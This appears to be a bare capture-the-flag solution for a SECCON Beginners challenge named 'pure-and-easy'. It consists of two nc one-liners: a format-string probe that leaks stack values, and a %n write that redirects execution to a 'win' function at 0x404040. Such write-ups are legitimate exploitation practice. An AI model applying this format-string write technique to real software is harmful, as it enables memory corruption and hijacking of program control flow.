python3 -c 'print("".join([f"%{i}$p." for i in range(10, 20)]) + " AAAAAAAAAAAAA", end="")' | nc pure-and-easy.beginners.seccon.games 9000

0x404040: 4199233 (win)

```
echo -en '%4199233c%21$nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x40\x40' | nc pure-and-easy.beginners.seccon.games 9000
```